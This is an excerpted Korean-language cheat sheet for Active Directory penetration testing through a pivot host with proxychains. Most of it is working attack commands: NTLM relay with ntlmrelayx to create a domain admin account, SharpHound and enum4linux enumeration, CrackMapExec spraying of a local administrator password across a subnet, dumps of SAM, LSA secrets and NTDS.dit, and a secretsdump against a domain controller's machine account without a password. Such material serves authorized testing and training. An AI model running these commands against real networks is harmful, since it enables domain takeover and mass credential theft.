...
대부분의 명령어는 피벗(Pivot) 환경을 전제로 proxychains 버전도 함께 수록하였다
proxychains는 TCP 기반 터널링이므로 Responder, mitm6 등 레이어2 브로드캐스트 기반 공격과 hashcat, john 등 로컬에서 실행하는 툴에는 적용되지 않으며, nmap은 TCP connect 스캔(-sT -Pn)만 사용 가능하다
...
2 - 타겟 리스트 생성 (TCP connect 스캔만 가능)
# SMB Signing 비활성화된 머신 목록을 찾고 저장
...
터미널 1 - ntlmrelayx.py (DC가 내부망에 있을 때)
# 도메인 어드민 계정 생성
...
# 피벗 호스트에서 SharpHound 실행 후 파일 회수
...
# 결과 파일들: domain_users.html / domain_groups.html / domain_computers.html / domain_policy.html
...
proxychains enum4linux -U [IP]  # 유저만
proxychains enum4linux -P [IP]  # 패스워드 정책만
# rpcclient (크리덴셜 없이)
...
# msfconsole 내부에서 setg Proxies 사용 (proxychains 명령어 대신)
1.msfconsole
2.setg Proxies socks5:127.0.0.1:1080  # 내부망 타겟 라우팅
...
# 보통 로컬 어드민 패스워드인 경우 → 네트워크 전체 전파
proxychains crackmapexec smb 10.10.10.0/24 -u Administrator -p [복호화된 패스워드] --local-auth
# Pwn3d! 뜨는 머신 → SAM 덤프 → 추가 해시 확보
...
# secretsdump.py로 해시 덤프
proxychains secretsdump.py -no-pass -just-dc [domain]/[DC-NETBIOS-NAME]\$@[DC-IP]
# 복구 (원래 패스워드 복원 필수!)
proxychains python3 restorepassword.py [domain]/[DC-NETBIOS-NAME]@[DC-IP] -target-ip [DC-IP] -hexpass [원래 hex 패스워드]
```
...
# CrackMapExec - LSA Secrets 덤프
proxychains crackmapexec smb [IP] -u [user] -p [pass] --lsa
# CrackMapExec - DC NTDS.dit 덤프
proxychains crackmapexec smb [IP] -u [user] -p [pass] --ntds
# secretsdump.py - SAM + LSA + NTDS 전부 덤프
